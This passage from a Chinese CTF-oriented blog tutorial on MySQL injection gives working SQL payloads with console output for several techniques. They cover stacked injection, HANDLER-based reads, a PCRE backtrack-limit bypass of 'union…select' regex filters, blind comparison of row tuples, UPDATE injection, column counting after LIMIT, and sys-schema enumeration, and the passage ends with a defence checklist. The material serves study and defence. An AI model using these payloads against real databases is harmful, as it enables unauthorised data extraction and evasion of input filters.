class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h6><ul>
<li>给username字段添加unique属性。</li>
<li>使用id字段作为判断用户的凭证。</li>
<li>插入数据前判断数据长度。</li>
</ul>
<h4 id="0x13-堆叠注入"><a href="#0x13-堆叠注入" class="headerlink" title="0x13.堆叠注入"></a>0x13.堆叠注入</h4><h6 id="简单的说，由于分号-为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。"><a href="#简单的说，由于分号-为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。" class="headerlink" title="简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。"></a>简单的说，由于分号<code>;</code>为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如<code>RENAME</code>、<code>DROP</code>等。</h6><h6 id="注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，-可考虑使用RENAME关键字，将想要的数据列名-表名更改成返回数据的SQL语句所定义的表-列名-。具体参考：2019强网杯——随便注Writeup"><a href="#注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，-可考虑使用RENAME关键字，将想要的数据列名-表名更改成返回数据的SQL语句所定义的表-列名-。具体参考：2019强网杯——随便注Writeup" class="headerlink" title="注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：2019强网杯——随便注Writeup"></a>注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用<code>RENAME</code>关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：<a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">2019强网杯——随便注Writeup</a></h6><h6 id="PHP中堆叠注入的支持情况："><a href="#PHP中堆叠注入的支持情况：" class="headerlink" title="PHP中堆叠注入的支持情况："></a>PHP中堆叠注入的支持情况：</h6><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">Mysqli</th>
<th align="center">PDO</th>
<th align="center">MySQL</th>
</tr>
</thead>
<tbody><tr>
<td align="center">引入的PHP版本</td>
<td align="center">5.0</td>
<td align="center">5.0</td>
<td align="center">3.0之前</td>
</tr>
<tr>
<td align="center">PHP5.x是否包含</td>
<td align="center">是</td>
<td align="center">是</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">多语句执行支持情况</td>
<td align="center">是</td>
<td align="center">大多数</td>
<td align="center">否</td>
</tr>
</tbody></table>
<h6 id="引自：PDO场景下的SQL注入探究"><a href="#引自：PDO场景下的SQL注入探究" class="headerlink" title="引自：PDO场景下的SQL注入探究"></a>引自：<a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">PDO场景下的SQL注入探究</a></h6><h4 id="0x14-handler语句代替select查询"><a href="#0x14-handler语句代替select查询" class="headerlink" title="0x14.handler语句代替select查询"></a>0x14.handler语句代替select查询</h4><h6 id="mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。"><a href="#mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。" class="headerlink" title="mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。"></a><code>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</code></h6><h6 id="语法结构："><a href="#语法结构：" class="headerlink" title="语法结构："></a>语法结构：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>

<h6 id="如：通过handler语句查询users表的内容"><a href="#如：通过handler语句查询users表的内容" class="headerlink" title="如：通过handler语句查询users表的内容"></a>如：通过handler语句查询users表的内容</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler yunensec read first; #读取指定表/句柄的首行数据</span><br><span class="line">handler yunensec read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler yunensec read next; #读取指定表/句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler yunensec close; #关闭句柄</span><br></pre></td></tr></table></figure>

<h4 id="0x15-一些小Trick"><a href="#0x15-一些小Trick" class="headerlink" title="0x15.一些小Trick"></a>0x15.一些小Trick</h4><h6 id="这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。"><a href="#这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。" class="headerlink" title="这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。"></a>这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。</h6><h6 id="PHP-union-select-ig绕过。"><a href="#PHP-union-select-ig绕过。" class="headerlink" title="PHP/union.+?select/ig绕过。"></a>PHP<code>/union.+?select/ig</code>绕过。</h6><h6 id="在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。"><a href="#在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。" class="headerlink" title="在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。"></a>在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。</h6><ul>
<li>利用点：<a href="https://bugs.php.net/bug.php?id=70699" target="_blank" rel="noopener">PHP正则回溯BUG</a></li>
<li>具体分析文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li>
</ul>
<h6 id="PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre-backtrack-limit。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数-默认为-100万-，那么正则停止，返回未匹配到数据。"><a href="#PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre-backtrack-limit。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数-默认为-100万-，那么正则停止，返回未匹配到数据。" class="headerlink" title="PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。"></a>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。</h6><h6 id="故而我们构造payload：union-100万个a，充当垃圾数据-select即可绕过正则判断。"><a href="#故而我们构造payload：union-100万个a，充当垃圾数据-select即可绕过正则判断。" class="headerlink" title="故而我们构造payload：union/*100万个a，充当垃圾数据*/select即可绕过正则判断。"></a>故而我们构造payload：<code>union/*100万个a，充当垃圾数据*/select</code>即可绕过正则判断。</h6><h6 id="一道相关的CTF题：TetCTF-2020-WP-BY-MrR3boot"><a href="#一道相关的CTF题：TetCTF-2020-WP-BY-MrR3boot" class="headerlink" title="一道相关的CTF题：TetCTF-2020 WP BY MrR3boot"></a>一道相关的CTF题：<a href="https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020" target="_blank" rel="noopener">TetCTF-2020 WP BY MrR3boot</a></h6><h4 id="0x16-无列名盲注"><a href="#0x16-无列名盲注" class="headerlink" title="0x16.无列名盲注"></a>0x16.无列名盲注</h4><h6 id="前边提到了，在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order-by盲注之外，这里再提一种新的方法，直接通过select进行盲注。"><a href="#前边提到了，在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order-by盲注之外，这里再提一种新的方法，直接通过select进行盲注。" class="headerlink" title="前边提到了，在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order by盲注之外，这里再提一种新的方法，直接通过select进行盲注。"></a>前边提到了，在知道表名，不知道列名的情况下，我们可以利用<code>union</code>来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的<code>order by</code>盲注之外，这里再提一种新的方法，直接通过select进行盲注。</h6><h6 id="核心payload：-select-39-admin-39-39-admin-39-gt-select-from-users-limit-1"><a href="#核心payload：-select-39-admin-39-39-admin-39-gt-select-from-users-limit-1" class="headerlink" title="核心payload：(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)"></a>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></h6><h6 id="子查询之间也可以直接通过-gt-、-lt-、-来进行判断。"><a href="#子查询之间也可以直接通过-gt-、-lt-、-来进行判断。" class="headerlink" title="子查询之间也可以直接通过&gt;、&lt;、=来进行判断。"></a>子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</h6><h6 id="例如：-14"><a href="#例如：-14" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *from test limit 1;</span><br><span class="line">+----+----------------+</span><br><span class="line">| id | content        |</span><br><span class="line">+----+----------------+</span><br><span class="line"> | 1 | flag&#123;ljdd520&#125;</span><br><span class="line">+----+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select 1,&apos;flag&#123;ljdd520&#125;&apos;)&gt;(select * from test limit 1);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| (select 1,&apos;flag&#123;ljdd520&#125;&apos;)&gt;(select * from test limit 1) |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">|                                                       1 |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select 1,&apos;flag&#123;ljdd5201&#125;&apos;)&gt;(select * from test limit 1);</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| (select 1,&apos;flag&#123;ljdd5201&#125;&apos;)&gt;(select * from test limit 1) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">|                                                        0 |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="0x17-UPDATE注入重复字段赋值"><a href="#0x17-UPDATE注入重复字段赋值" class="headerlink" title="0x17.UPDATE注入重复字段赋值"></a>0x17.UPDATE注入重复字段赋值</h4><h6 id="即：UPDATA-table-name-set-field1-new-value-field1-new-value2-where-，最终field1字段的内容为new-value2，可用这个特性来进行UPDATA注入。如："><a href="#即：UPDATA-table-name-set-field1-new-value-field1-new-value2-where-，最终field1字段的内容为new-value2，可用这个特性来进行UPDATA注入。如：" class="headerlink" title="即：UPDATA table_name set field1=new_value,field1=new_value2 [where]，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如："></a>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where]</code>，最终<code>field1</code>字段的内容为<code>new_value2</code>，可用这个特性来进行UPDATA注入。如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name set field1=new_value,field1=(select user()) [where]</span><br></pre></td></tr></table></figure>

<h4 id="0x18-LIMIT之后的字段数判断"><a href="#0x18-LIMIT之后的字段数判断" class="headerlink" title="0x18.LIMIT之后的字段数判断"></a>0x18.LIMIT之后的字段数判断</h4><h6 id="我们都知道若注入点在where子语句之后，判断字段数可以用order-by或group-by来进行判断，而limit后可以利用-into-判断字段数，其中-为mysql临时变量。"><a href="#我们都知道若注入点在where子语句之后，判断字段数可以用order-by或group-by来进行判断，而limit后可以利用-into-判断字段数，其中-为mysql临时变量。" class="headerlink" title="我们都知道若注入点在where子语句之后，判断字段数可以用order by或group by来进行判断，而limit后可以利用 into @,@ 判断字段数，其中@为mysql临时变量。"></a>我们都知道若注入点在where子语句之后，判断字段数可以用<code>order by</code>或<code>group by</code>来进行判断，而<code>limit</code>后可以利用 <code>into @,@</code> 判断字段数，其中@为mysql临时变量。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-7.jpg" alt></p>
<h6 id="例如：-15"><a href="#例如：-15" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *from test;</span><br><span class="line">+----+----------------+</span><br><span class="line">| id | content        |</span><br><span class="line">+----+----------------+</span><br><span class="line"> | 1 | flag&#123;ljdd520&#125;</span><br><span class="line">|  2 | flag&#123;lydd520&#125;  |</span><br><span class="line">|  3 | flag&#123;ludd520&#125;  |</span><br><span class="line">|  4 | admin&apos; #       |</span><br><span class="line">+----+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *from test where content like &apos;a%&apos; limit 1,1  into @,@;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *from test where content like &apos;a%&apos; limit 1,1  into @;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>

<h4 id="0x19-sys系统库"><a href="#0x19-sys系统库" class="headerlink" title="0x19.sys系统库"></a>0x19.sys系统库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#查询所有的库：</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）：</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&apos;mspwd&apos; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema=&apos;mspwd&apos; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;</span><br><span class="line">#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br></pre></td></tr></table></figure>

<h6 id="节选自：Mysql的奇淫技巧-黑科技"><a href="#节选自：Mysql的奇淫技巧-黑科技" class="headerlink" title="节选自：Mysql的奇淫技巧(黑科技)"></a>节选自：<a href="https://www.t00ls.net/thread-54783-1-1.html" target="_blank" rel="noopener">Mysql的奇淫技巧(黑科技)</a></h6><table>
<thead>
<tr>
<th align="center">视图-&gt;列名</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">host_summary -&gt; host、total_connections</td>
<td align="center">历史连接IP、对应IP的连接次数</td>
</tr>
<tr>
<td align="center">innodb_buffer_stats_by_schema -&gt; object_schema</td>
<td align="center">库名</td>
</tr>
<tr>
<td align="center">innodb_buffer_stats_by_table -&gt; object_schema、object_name</td>
<td align="center">库名、表名(可指定)</td>
</tr>
<tr>
<td align="center">io_global_by_file_by_bytes -&gt; file</td>
<td align="center">路径中包含库名</td>
</tr>
<tr>
<td align="center">io_global_by_file_by_latency -&gt; file</td>
<td align="center">路径中包含库名</td>
</tr>
<tr>
<td align="center">processlist -&gt; current_statement、last_statement</td>
<td align="center">当前数据库正在执行的语句、该句柄执行的上一条语句</td>
</tr>
<tr>
<td align="center">schema_auto_increment_columns -&gt; table_schema、table_name、column_name</td>
<td align="center">库名、表名、列名</td>
</tr>
<tr>
<td align="center">schema_index_statistics -&gt; table_schema、table_name</td>
<td align="center">库名、表名</td>
</tr>
<tr>
<td align="center">schema_object_overview -&gt; db</td>
<td align="center">库名</td>
</tr>
<tr>
<td align="center">schema_table_statistics -&gt; table_schema、table_name</td>
<td align="center">库名、表名</td>
</tr>
<tr>
<td align="center">schema_table_statistics_with_buffer -&gt; table_schema、table_name</td>
<td align="center">库名、表名</td>
</tr>
<tr>
<td align="center">schema_tables_with_full_table_scans -&gt; object_schema、object_name</td>
<td align="center">库名、表名(全面扫描访问)</td>
</tr>
<tr>
<td align="center">session -&gt; current_statement、last_statement</td>
<td align="center">当前数据库正在执行的语句、该句柄执行的上一条语句</td>
</tr>
<tr>
<td align="center">statement_analysis -&gt; query、db</td>
<td align="center">数据库最近执行的请求、对于请求访问的数据库名</td>
</tr>
<tr>
<td align="center">statementswith* -&gt; query、db</td>
<td align="center">数据库最近执行的特殊情况的请求、对应请求的数据库</td>
</tr>
<tr>
<td align="center">version -&gt; mysql_version</td>
<td align="center">mysql版本信息</td>
</tr>
<tr>
<td align="center">x$innodb_buffer_stats_by_schema</td>
<td align="center">同innodb_buffer_stats_by_schema</td>
</tr>
<tr>
<td align="center">x$innodb_buffer_stats_by_table</td>
<td align="center">同innodb_buffer_stats_by_table</td>
</tr>
<tr>
<td align="center">x$io_global_by_file_by_bytes</td>
<td align="center">同io_global_by_file_by_bytes</td>
</tr>
<tr>
<td align="center">……</td>
<td align="center">同……</td>
</tr>
<tr>
<td align="center">x$schema_flattened_keys -&gt; table_schema、table_name、index_columns</td>
<td align="center">库名、表名、主键名</td>
</tr>
<tr>
<td align="center">x$ps_schema_table_statistics_io -&gt; table_schema、table_name、count_read</td>
<td align="center">库名、表名、读取该表的次数</td>
</tr>
</tbody></table>
<h6 id="还有就是mysql数据库也可以查询表名、库名。"><a href="#还有就是mysql数据库也可以查询表名、库名。" class="headerlink" title="还有就是mysql数据库也可以查询表名、库名。"></a>还有就是mysql数据库也可以查询表名、库名。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name=database();</span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name=database();</span><br></pre></td></tr></table></figure>

<h4 id="0x20-Mysql注入防御"><a href="#0x20-Mysql注入防御" class="headerlink" title="0x20.Mysql注入防御"></a>0x20.Mysql注入防御</h4><ul>
<li>单引号闭合可控变量，并进行相应的转义处理</li>
<li>尽量使用预编译来执行SQL语句</li>
<li>采用白名单机制/完善黑名单</li>
<li>安装WAF防护软件</li>
<li>拒绝不安全的编码转换，尽量统一编码</li>
<li>关闭错误提示</li>
</ul>
<h4 id="0x21-结语"><a href="#0x21-结语" class="headerlink" title="0x21.结语"></a>0x21.结语</h4><h6 id="东西有点多，可能要慢慢吸收。"><a href="#东西有点多，可能要慢慢吸收。" class="headerlink" title="东西有点多，可能要慢慢吸收。"></a>东西有点多，可能要慢慢吸收。</h6><h4 id="0x22-参考"><a href="#0x22-参考" class="headerlink" title="0x22.参考"></a>0x22.参考</h4><h6 id="【PHP代码审计】入门之路——第二篇-宽字节注入"><a href="#【PHP代码审计】入门之路——第二篇-宽字节注入" class="headerlink" title="【PHP代码审计】入门之路——第二篇-宽字节注入"></a><a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">【PHP代码审计】入门之路——第二篇-宽字节注入</a></h6><h6 id="MySQL注入技巧"><a href="#MySQL注入技巧" class="headerlink" title="MySQL注入技巧"></a><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">MySQL注入技巧</a></h6><h6 id="Mysql-注入基础小结"><a href="#Mysql-注入基础小结" class="headerlink" title="Mysql 注入基础小结"></a><a href="https://blog.sari3l.com/posts/9622f295/" target="_blank" rel="noopener">Mysql 注入基础小结</a></h6><h6 id="Mysql的奇淫技巧-黑科技"><a href="#Mysql的奇淫技巧-黑科技" class="headerlink" title="Mysql的奇淫技巧(黑科技)"></a><a href="https://www.t00ls.net/thread-54783-1-1.html" target="_blank" rel="noopener">Mysql的奇淫技巧(黑科技)</a></h6><h6 id="Read-MySQL-Client’s-File"><a href="#Read-MySQL-Client’s-File" class="headerlink" title="Read MySQL Client’s File"></a><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File</a></h6><h6 id="Dnslog在SQL注入中的实战"><a href="#Dnslog在SQL注入中的实战" class="headerlink" title="Dnslog在SQL注入中的实战"></a><a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></h6><h6 id="从安全角度深入理解MySQL编码转换机制"><a href="#从安全角度深入理解MySQL编码转换机制" class="headerlink" title="从安全角度深入理解MySQL编码转换机制"></a><a href="https://www.freebuf.com/articles/web/154932.html" target="_blank" rel="noopener">从安全角度深入理解MySQL编码转换机制</a></h6><h6 id="mysql-sys-Schema-Object-Index"><a href="#mysql-sys-Schema-Object-Index" class="headerlink" title="mysql sys Schema Object Index"></a><a href="https://dev.mysql.com/doc/refman/8.0/en/sys-schema-object-index.html" target="_blank" rel="noopener">mysql sys Schema Object Index</a></h6><h6 id="对MYSQL注入相关内容及部分Trick的归类小结"><a href="#对MYSQL注入相关内容及部分Trick的归类小结" class="headerlink" title="对MYSQL注入相关内容及部分Trick的归类小结"></a><a href="https://xz.aliyun.com/t/7169#toc-46" target="_blank" rel="noopener">对MYSQL注入相关内容及部分Trick的归类小结</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/01/28/TetCTF部分web题解/" rel="next" title="TetCTF部分web题解">
                <i class="fa fa-chevron-left"></i> TetCTF部分web题解
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/02/01/BambooFox-CTF-2021部分web题总结/" rel="prev" title="BambooFox CTF 2021部分web题总结">
                BambooFox CTF 2021部分web题总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">51</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#……"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">……</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-查"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 查</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-有回显"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.有回显</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u-id-自己定义的一个字段-这样一个字段返回的结果，例如："><span class="nav-number">1.2.1.1.</span> <span class="nav-text">对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u_id(自己定义的一个字段)这样一个字段返回的结果，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于上面的回显我们一般用union-select的组合来进行注入，例如："><span class="nav-number">1.2.1.2.</span> <span class="nav-text">对于上面的回显我们一般用union+select的组合来进行注入，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PS-注意："><span class="nav-number">1.2.1.3.</span> <span class="nav-text">PS 注意：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-无回显"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.无回显</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#示例代码："><span 